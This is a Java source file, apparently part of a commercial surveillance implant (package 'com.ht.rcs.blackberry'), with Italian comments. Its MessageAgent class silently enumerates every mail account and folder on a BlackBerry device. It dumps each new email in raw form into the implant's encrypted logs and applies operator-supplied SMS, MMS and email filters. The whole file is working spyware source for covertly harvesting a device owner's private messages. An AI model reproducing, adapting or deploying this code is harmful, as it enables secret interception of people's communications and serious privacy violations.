package com.ht.rcs.blackberry.agent;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.util.Date;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.BodyPart;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.blackberry.api.mail.MimeBodyPart;
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.ServiceConfiguration;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.device.api.io.http.HttpDateParser;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.IntHashtable;

import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.log.LogType;
import com.ht.rcs.blackberry.log.Markup;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.DateTime;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.rcs.blackberry.utils.WChar;

/*
 * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
 * 
 * 118  #define LOGTYPE_MAIL_RAW                        0x1001
 119 #define LOGTYPE_MAIL                            0x0210


 * 198  typedef struct _MailAdditionalData {
 199         UINT uVersion;
 200                 #define LOG_MAIL_VERSION 2009070301
 201         UINT uFlags;
 202         UINT uSize;
 203         FILETIME ftTime;
 204 } MailAdditionalData, *pMailAdditionalData;

 http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp

 uFlags = 1 : body retrieved
 0: non ha superato i controlli di size, il body viene tagliato


 */

public class MessageAgent extends Agent {

    private static final byte PREFIX_TYPE_IDENTIFICATION = 1;
    private static final byte PREFIX_TYPE_FILTER = 2;
    private static final int PREFIX_TYPE_HEADER = 64;
    private static final int PREFIX_TYPE_KEYWORD = 1;

    private static final int FILTER_TYPE_REALTIME = 0;
    private static final int FILTER_TYPE_COLLECT = 1;

    private static final int FILTER_CLASS_UNKNOWN = 0;
    private static final int FILTER_CLASS_SMS = 1;
    private static final int FILTER_CLASS_MMS = 2;
    private static final int FILTER_CLASS_EMAIL = 3;

    protected class Prefix {
        public int length;
        public byte type;

        public int payloadStart;
        //public byte[] payload;

        private boolean valid;

        public Prefix(final byte[] conf, final int offset) {
            DataBuffer databuffer = new DataBuffer(conf, offset, conf.length
                    - offset, false);
            try {
                byte bl0 = databuffer.readByte();
                byte bl1 = databuffer.readByte();
                byte bl2 = databuffer.readByte();
                type = databuffer.readByte();

                length = bl0 + (bl1 << 8) + (bl2 << 16);

                //payload = new byte[length];
                //databuffer.read(payload);

                payloadStart = offset + 4;

                //#debug
                debug.trace("Token type: " + type + " len: " + length
                        + " payload:"
                        + Utils.byteArrayToHex(conf, payloadStart, length));
                valid = true;
            } catch (EOFException e) {
                //#debug
                debug.error("cannot parse Token: " + e);
                valid = false;
            }
        }

        public boolean isValid() {
            return valid;
        }
    }

    protected class Filter {
        private static final int PREFIX_LEN = 4;

        public long size;

        public long version;
        public long type;
        public byte[] classname;
        public int classtype;

        public boolean enabled;
        public boolean all;
        public boolean doFilterFromDate;
        public long fromDate;
        public boolean doFilterToDate;
        public long toDate;
        public long maxMessageSize;
        public long maxMessageSizeToLog;

        public Vector keywords = new Vector();

        boolean valid;

        public int payloadStart;

        public Filter(final byte[] conf, final int offset, final int length) {
            int headerSize = 116;
            int classNameLen = 32;
            int confSize = conf.length - offset;

            Check.requires(confSize >= headerSize, "conf smaller than needed");

            Prefix headerPrefix = new Prefix(conf, offset);

            if (!headerPrefix.isValid()) {
                return;
            }

            DataBuffer databuffer = new DataBuffer(conf,
                    headerPrefix.payloadStart, headerPrefix.length, false);

            //#ifdef DBC
            Check.asserts(headerPrefix.type == PREFIX_TYPE_HEADER,
                    "Wrong prefix type");
            Check.asserts(headerSize == headerPrefix.length,
                    "Wrong prefix length");
            //#endif

            // LETTURA del HEADER
            try {

                size = databuffer.readInt();
                version = databuffer.readInt();
                type = databuffer.readInt();
                classname = new byte[classNameLen];
                databuffer.read(classname);

                String classString = WChar.getString(classname, false);
                if (classString.equals("IPM.SMSText*")) {
                    classtype = FILTER_CLASS_SMS;
                } else if (classString.equals("IPM.Note*")) {
                    classtype = FILTER_CLASS_EMAIL;
                } else if (classString.equals("IPM.MMS*")) {
                    classtype = FILTER_CLASS_MMS;
                } else {
                    classtype = FILTER_CLASS_UNKNOWN;
                    //#debug
                    debug.error("classtype unknown: " + classString);
                }

                //#debug
                debug.trace("classname: " + classString);

                enabled = databuffer.readBoolean();
                all = databuffer.readBoolean();
                doFilterFromDate = databuffer.readBoolean();
                fromDate = databuffer.readLong();
                doFilterToDate = databuffer.readBoolean();
                toDate = databuffer.readLong();
                maxMessageSize = databuffer.readLong();
                maxMessageSizeToLog = databuffer.readLong();

                payloadStart = (int) (headerPrefix.payloadStart + size);

                valid = true;
            } catch (EOFException e) {
                valid = false;

            }

            // Lettura delle KEYWORDS
            if (length > headerPrefix.length) {
                // ogni keyword ha il suo prefix
                int endOffset = offset + length;
                int keywordOffset = offset + headerSize + PREFIX_LEN;

                while (keywordOffset < endOffset) {
                    Prefix keywordPrefix = new Prefix(conf, keywordOffset);

                    //#ifdef DBC
                    Check.asserts(keywordPrefix.type == PREFIX_TYPE_KEYWORD,
                            "Wrong prefix type");
                    //#endif

                    String keyword = WChar.getString(conf, keywordOffset,
                            keywordPrefix.length, false);
                    keywordOffset += keywordPrefix.length + PREFIX_LEN;

                    debug.trace("Keyword: " + keyword);
                    keywords.addElement(keyword);
                }
            }
        }

        public boolean isValid() {
            return valid;
        }
    }

    //#debug
    static Debug debug = new Debug("SmsAgent", DebugLevel.VERBOSE);

    protected static final int BODY = 1;
    protected static final int SLEEPTIME = 5000;
    protected static final boolean FILTERFROM = false;
    protected static final boolean FILTERTO = false;
    protected static final String DATEFROM = "Tue, Mar 23 2010 06:31:27 GMT";
    protected static final String DATETO = "Tue, Apr 01 2010 22:31:27 GMT";
    protected static final boolean FILTERDIM = false;
    protected static final int BODYDIM = 0;
    protected static final boolean DEBUG = false;
    protected static IntHashtable _fieldTable;
    private static boolean _editable;
    protected static Store _store;
    private static ServiceRecord[] _mailServiceRecords;
    protected static long lastcheck;

    Markup markup_date;

    protected static final int[] HEADER_KEYS = { Message.RecipientType.TO,
            Message.RecipientType.CC, Message.RecipientType.BCC };

    private static final int MAIL_VERSION = 2009070301;

    public MessageAgent(boolean agentStatus) {
        super(AGENT_MESSAGE, agentStatus, true, "MessageAgent");

        // #ifdef DBC
        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.MAIL_RAW,
                "Wrong Conversion");
        // #endif
    }

    protected MessageAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        // mantiene la data prima di controllare tutte le email
        markup_date = new Markup(agentId, Keys.getInstance().getAesKey());

        setDelay(SLEEPTIME);
        setPeriod(SLEEPTIME);

    }

    long timestamp;
    long firsttimestamp = 0;

    protected String identification;
    public Vector filtersSMS = new Vector();
    public Vector filtersMMS = new Vector();
    public Vector filtersEMAIL = new Vector();

    protected boolean parse(final byte[] conf) {

        Vector tokens = tokenize(conf);
        if (tokens == null) {
            //#debug
            debug.error("Cannot tokenize conf");
            return false;
        }

        int size = tokens.size();
        for (int i = 0; i < size; ++i) {
            Prefix token = (Prefix) tokens.elementAt(i);

            switch (token.type) {
            case PREFIX_TYPE_IDENTIFICATION:
                // IDENTIFICATION TAG 
                identification = WChar.getString(conf, token.payloadStart,
                        token.length, false);
                //#debug
                debug.trace("Type 1: " + identification);
                break;
            case PREFIX_TYPE_FILTER:
                // Filtro (sempre 2, uno COLLECT e uno REALTIME);
                try {
                    Filter filter = new Filter(conf, token.payloadStart,
                            token.length);
                    if (filter.isValid()) {
                        switch (filter.classtype) {
                        case FILTER_CLASS_EMAIL:
                            //#debug
                            debug.trace("Adding email filter: " + filter.type);
                            filtersEMAIL.addElement(filter);
                            break;
                        case FILTER_CLASS_MMS:
                            //#debug
                            debug.trace("Adding mms filter: " + filter.type);
                            filtersMMS.addElement(filter);
                            break;
                        case FILTER_CLASS_SMS:
                            //#debug
                            debug.trace("Adding sms filter: " + filter.type);
                            filtersSMS.addElement(filter);
                            break;
                        case FILTER_CLASS_UNKNOWN: // fall through
                        default:
                            //#debug
                            debug.error("unknown classtype: "
                                    + filter.classtype);
                            break;
                        }
                    }
                    //#debug
                    debug.trace("Type 2: header valid: " + filter.isValid());
                } catch (Exception e) {
                    //#debug
                    debug.error("Cannot filter" + e);
                }
                break;

            default:
                debug.error("Unknown type: " + token.type);
                break;
            }

            //tokens.removeElementAt(i);
        }

        return true;
    }

    private Vector tokenize(byte[] conf) {
        Vector tokens = new Vector();
        int offset = 0;
        int length = conf.length;

        while (offset < length) {
            Prefix token = new Prefix(conf, offset);
            if (!token.isValid()) {

                return null;
            } else {
                tokens.addElement(token);
                offset += token.length + 4;
            }
        }

        return tokens;
    }

    public void actualStart() {

    }

    public void actualStop() {

    }

    public void actualRun() {
        // #debug
        debug.trace("run");

        if (markup_date.isMarkup() == false) {
            debug.info("Il Markup non esiste, timestamp = 0 ");
            timestamp = 0;
            Date date = new Date();
            firsttimestamp = date.getTime();

        } else {
            // serializzi la data date
            debug
                    .info("::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::");
            Date date = new Date();
            timestamp = date.getTime();

            byte[] deserialized;
            debug.trace("Sto leggendo dal markup");
            try {
                deserialized = markup_date.readMarkup();
                lastcheck = Utils.byteArrayToLong(deserialized, 0);

            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            debug.trace("Cominciamo a spulciare gli account di posta...");
        }

        ServiceBook serviceBook = ServiceBook.getSB();
        _mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
        String[] names = new String[_mailServiceRecords.length];

        debug.trace("Ci sono: " + _mailServiceRecords.length
                + " account di posta!");

        // Controllo tutti gli account di posta
        for (int count = _mailServiceRecords.length - 1; count >= 0; --count) {
            names[count] = _mailServiceRecords[count].getName();
            debug.trace("Nome dell'account di posta: " + names[count]);

            names[count] = _mailServiceRecords[0].getName();
            ServiceConfiguration sc = new ServiceConfiguration(
                    _mailServiceRecords[count]);
            _store = Session.getInstance(sc).getStore();

            Folder[] folders = _store.list();
            // Scandisco ogni Folder dell'account di posta
            scanFolder(folders);
        }
        debug.trace("Fine ricerca!!");

        // Crea markup_finished per tenere traccia del controllo
        // concluso
        // correttamente
        if (timestamp == 0) {
            timestamp = firsttimestamp;
        }

        debug.trace("Sto scrivendo nel markup");
        byte[] serialize = Utils.longToByteArray(timestamp);
        markup_date.writeMarkup(serialize);

        // return true;
    }

    /**
     * scansione ricorsiva della directories
     * 
     * @param subfolders
     */
    public void scanFolder(Folder[] subfolders) {
        Folder[] dirs;
        long dataArrivo, filterDate;
        // Date emailDate;
        boolean printEmail;

        // Date receivedDate;
        if (subfolders.length <= 0) {
            return;
        }
        for (int count = 0; count < subfolders.length; count++) {
            debug.trace("Nome della cartella: "
                    + subfolders[count].getFullName());
            dirs = subfolders[count].list();
            scanFolder(dirs);
            try {
                Message[] messages = subfolders[count].getMessages();
                // Scandisco ogni e-mail dell'account di posta
                for (int j = 0; j < messages.length; j++) {
                    Message message = messages[j];

                    printEmail = false;

                    debug.trace("Data di invio dell'email "
                            + message.getSentDate() + " long: "
                            + message.getSentDate().getTime());
                    debug.trace("Data di arrivo dell'email "
                            + message.getReceivedDate() + " long: "
                            + message.getReceivedDate().getTime());
                    debug.trace("Data del filtro FROM " + DATEFROM + " long: "
                            + HttpDateParser.parse(DATEFROM));
                    debug.trace("Data del filtro TO " + DATETO + " long: "
                            + HttpDateParser.parse(DATETO));

                    // Se c'e' un filtro sulla data
                    // entro
                    if (FILTERFROM == true) {
                        dataArrivo = message.getReceivedDate().getTime();
                        filterDate = HttpDateParser.parse(DATEFROM);
                        // Se la data e' successiva a quella dell'ultima
                        // lettura e la data dell'email e' successiva a
                        // quella del filtro
                        if (dataArrivo >= lastcheck && dataArrivo >= filterDate) {
                            // Se c'e' anche il filtro della data di fine
                            if (FILTERTO == true) {
                                filterDate = HttpDateParser.parse(DATETO);
                                // Se la data dell'email e' tra data di
                                // inizio e data di fine => OK
                                if (dataArrivo <= filterDate) {
                                    debug
                                            .trace("Sono attivi i 2 filtri e l'email rispetta i 2 criteri FROM e TO");
                                    printEmail = true;
                                }
                            } else {
                                debug
                                        .trace("E' attivo solo il filtro FROM e l'email rispetta questo criterio");
                                // Se la data dell'email e' corretta, e c'e'
                                // solo il primo filtro ma non il secondo =>
                                // OK
                                printEmail = true;
                            }
                        }

                    } else {
                        debug
                                .trace("Non sono attivi criteri quindi l'email viene acquisita");
                        // Se non ci sono filtri
                        dataArrivo = message.getReceivedDate().getTime();
                        debug.trace("dataArrivo = " + dataArrivo
                                + "lastcheck = " + lastcheck);
                        if (dataArrivo >= lastcheck) {
                            printEmail = true;
                        }
                    }

                    if (printEmail == true) {

                        saveLog(message);

                        debug
                                .trace("-------------------------------- e-mail numero "
                                        + j
                                        + " ---------------------------------");
                        debug
                                .trace("Mittente dell'email: "
                                        + message.getFrom());
                        // debug.trace("Destinatario dell'email: " +
                        // message.getReplyTo());
                        Address[] addresses = message
                                .getRecipients(HEADER_KEYS[0]);
                        String name = addresses[0].getAddr();
                        debug.trace("Destinatario dell'email: " + name);

                        debug.trace("Dimensione dell'email: "
                                + message.getSize() + "bytes");
                        debug.trace("Data invio dell'email: "
                                + message.getSentDate());
                        debug.trace("Oggetto dell'email: "
                                + message.getSubject());
                        // Date dataArrivo = message.getReceivedDate();
                        // Date dataArrivo = message.getSentDate();
                        // Date expirationDate = new
                        // Date(HttpDateParser.parse(dataArrivo.toString()));
                        // System.out.println("Data di arrivo dell'email long: "
                        // + expirationDate.getTime());
                        debug.trace("Data di invio dell'email long: "
                                + message.getSentDate().getTime());
                        debug.trace("Data di arrivo dell'email long: "
                                + message.getReceivedDate().getTime());
                        // Date data = new Date();
                        // long timeArrived;
                        // timeArrived = data.getTime();

                        Object obj = message.getContent();

                        Multipart parent = null;
                        if (obj instanceof MimeBodyPart
                                || obj instanceof TextBodyPart) {
                            BodyPart bp = (BodyPart) obj;
                            parent = bp.getParent();
                        } else {
                            parent = (Multipart) obj;
                        }

                        // Display the message body
                        String mpType = parent.getContentType();
                        if (mpType
                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
                                || mpType
                                        .equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
                            displayMultipart(parent);
                        }
                        System.out
                                .println("-------------------------------------------------------------------------------------");
                    }
                }
            } catch (MessagingException e) {
                debug.trace("Folder#getMessages() threw " + e.toString());

            }
        }
    }

    private void saveLog(Message message) {

        ByteArrayOutputStream os = null;
        try {
            os = new ByteArrayOutputStream();
            message.writeTo(os);
            byte[] content = os.toByteArray();

            String messageContent = new String(content);
            debug.trace(messageContent);

            int flags = 1;
            int size = message.getSize();
            DateTime filetime = new DateTime(message.getReceivedDate());

            byte[] additionalData = new byte[20];
            /*
             * UINT uVersion; 200 #define LOG_MAIL_VERSION 2009070301 201 UINT
             * uFlags; 202 UINT uSize; 203 FILETIME ftTime;
             */

            DataBuffer databuffer = new DataBuffer(additionalData, 0, 20, false);
            databuffer.writeInt(MAIL_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeInt(size);
            databuffer.writeLong(filetime.getTicks());
            Check.ensures(additionalData.length == 20, "Wrong buffer size");

            log.createLog(additionalData);
            log.writeLog(content);
            log.close();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (IOException e) {
                }
            }
        }
    }

    /**
     * controlla se il messaggio e' mime e ne stampa il contenuto
     * 
     * @param multipart
     */
    protected static void displayMultipart(Multipart multipart) {
        // This vector stores fields which are to be displayed only after all
        // of the body fields are displayed. (Attachments and Contacts).
        Vector delayedFields = new Vector();

        // Process each part of the multi-part, taking the appropriate action
        // depending on the part's type. This loop should: display text and
        // html body parts, recursively display multi-parts and store
        // attachments and contacts to display later.
        for (int index = 0; index < multipart.getCount(); index++) {
            BodyPart bodyPart = multipart.getBodyPart(index);

            // If this body part is text then display all of it
            if (bodyPart instanceof TextBodyPart) {
                TextBodyPart textBodyPart = (TextBodyPart) bodyPart;

                // If there are missing parts of the text, try to retrieve the
                // rest of it.
                if (textBodyPart.hasMore()) {
                    try {
                        Transport.more(textBodyPart, true);
                    } catch (Exception e) {
                        debug.trace("Transport.more(BodyPart, boolean) threw "
                                + e.toString());
                    }
                }
                String plainText = (String) textBodyPart.getContent();

                // Display the plain text, using an EditField if the message is
                // editable or a RichTextField if it is not editable. Note: this
                // does not add any empty fields.
                if (plainText.length() != 0) {
                    if (FILTERDIM == true && plainText.length() > BODYDIM) {
                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
                        plainText = plainText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
                    }
                    debug.trace("Testo dell'email :" + plainText);
                }
            } else if (bodyPart instanceof MimeBodyPart) {
                MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;

                // If the content is text then display it
                String contentType = mimeBodyPart.getContentType();
                if (contentType
                        .startsWith(BodyPart.ContentType.TYPE_TEXT_HTML_STRING)) {
                    Object obj = mimeBodyPart.getContent();
                    if (obj != null) {
                        String htmlText = new String((byte[]) obj);
                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
                        if (FILTERDIM == true && htmlText.length() > BODYDIM) {
                            htmlText = htmlText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
                        }
                        debug.trace("Testo dell'email MIME: " + htmlText);
                    }
                } else if (contentType
                        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                    // If the body part is a multi-part and it has the the
                    // content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
                    // recursively display the multi-part.
                    Object obj = mimeBodyPart.getContent();
                    if (obj instanceof Multipart) {
                        Multipart childMultipart = (Multipart) obj;
                        String childMultipartType = childMultipart
                                .getContentType();
                        if (childMultipartType
                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                            displayMultipart(childMultipart);
                        }
                    }
                }
            }

        }

        // Now that the body parts have been displayed, display the queued
        // fields while separating them by inserting a separator field.
        for (int index = 0; index < delayedFields.size(); index++) {
            // System.out.println(delayedFields.elementAt(index));
            debug.trace(delayedFields.elementAt(index).toString());
        }
    }

}
